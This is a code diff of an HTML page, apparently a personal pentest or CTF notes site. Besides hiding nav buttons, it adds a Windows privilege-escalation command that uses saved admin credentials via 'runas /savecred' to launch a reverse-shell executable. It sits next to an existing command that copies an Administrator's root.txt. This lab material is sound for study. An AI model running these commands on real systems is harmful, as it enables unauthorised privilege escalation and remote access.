@@ -64,11 +64,11 @@
 
             <div class="nav__btns">
                 <!--Theme change button-->
-                <i class="uil uil-moon change-theme" id="theme-button"></i>
+                <!-- <i class="uil uil-moon change-theme" id="theme-button"></i>
 
                 <div class="nav__toggle" id="nav-toggle">
                     <i class="uil uil-apps"></i>
-                </div>
+                </div> -->
             </div>
         </nav>
     </header>
@@ -80,6 +80,8 @@
 </p><pre id="7cac319e-dac9-4d0a-94da-f6346fabb54f" class="code"><code>#find users with stored credentials
 cmdkey /list
 #run commands as the user with stored creds
+runas /savecred /user:admin C:\PrivEsc\reverse.exe
+#OR
 C:\Windows\System32\runas.exe /user:ACCESS\Administrator /savecred &quot;C:\Windows\System32\cmd.exe /c TYPE C:\Users\Administrator\Desktop\root.txt &gt; C:\Users\security\root.txt</code></pre><p id="21ce15ea-39fe-42ae-9281-f0189d430784" class="">
 </p></div></article></main></main>
 
